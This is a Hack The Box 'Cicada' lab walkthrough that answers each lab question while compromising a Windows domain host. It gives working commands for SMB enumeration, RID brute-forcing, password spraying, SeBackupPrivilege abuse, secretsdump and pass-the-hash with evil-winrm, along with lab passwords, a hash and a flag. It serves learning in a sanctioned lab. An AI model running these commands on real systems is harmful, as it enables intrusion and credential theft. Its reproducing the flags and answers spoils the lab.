# Cicada HTB Labs walkthrough

What is the name of the non-default SMB share that is readable with guest access on Cicada?

NMAP scan shows that smb port 445 is open and the question indicates that guest is accessible.
Using this I used SMBMap with the user guest to enumerate the shares, and this shows us that we have read access to "HR".
![SMBMap](<IMages/Screenshot 2025-03-09 220324.png>)

What is the name of the file found in the HR share?

Let's now enumerate the HR share using SMBMap
Using the -r flag in SMBMap allows us to see the name of the file which is:
"Notice from HR.txt"

Which user account is still using the company default password?

Using the --download "HR\Notice from HR.txt" we can see there is a new hire with the default password:
Cicada$M6Corpb*@Lp#nZp!8

We now need to find the account name.

lets use crackmapexec to try and find valid usernames
crackmapexec smb 10.10.11.35 -u 'guest' -p "" --rid-brute | grep "SidTypeUser"    

![Usernames](<IMages/Screenshot 2025-03-09 224323.png>)
Now we have valid usernames, lets try and crack the account using msfconsole scanner/smb/smb_login

set all the options and exploit
10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'


Which user has left their password in Active Directory metadata?

Let's use our known user details to enumerate AD fields using credentialed crackmapexec
We find the following account david.orelious with the description
'Just in case I forget my password is aRt$Lp#7t*VQ!3' which seems like a password

What is the name of the PowerShell script located in the DEV share?

lets use david to enumerate and see if we can access "DEV"
After using SMBmap i see we now have read access to DEV
There is a backup_script.ps1 inside of Dev - this may hold credentials or other vital info
downloaded to machine

What is the emily.oscars user's password?

As expected, reading the script gives us emilt.oscars password
"Q!3@Lp#M6b*7t*Vt"

Submit the flag located in the emily.oscars user's home directory.

Using evilwin-rm I manage to connect to the machine using these credentials (Needed to add cicada.htb to hosts file and connect with cicada.htb using evil-winrm)
I traversed to desktop and found the flag:
a3fbf886d263e73beb7445106567cfa8

What dangerous privilege does the emily.oscar user have associated with their account?

i used the coommand whoami /priv to get their privs
![Privs](<IMages/Screenshot 2025-03-09 230911.png>)

SEBackupPrivilege

What is the Administrator user's NTLM hash?

i found this walkthrough when searching about the privs
https://medium.com/@irfanbhat3/windows-privilege-escalation-through-sebackup-serestore-dd00604ce6b5

I traversed directory to programdata and followed the steps - however i used the download command rather than setting up a network share

then i used the following impacket command:
python3 /home/kali/impacket/examples/secretsdump.py -sam sam -system system LOCAL
providing me with the admin NTLM hash

Submit the flag located on the Administrator user's Desktop.

We can conduct a pass the hash to gain access with evil-winrm
evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341

once we have access we can go to the desktop and find the flag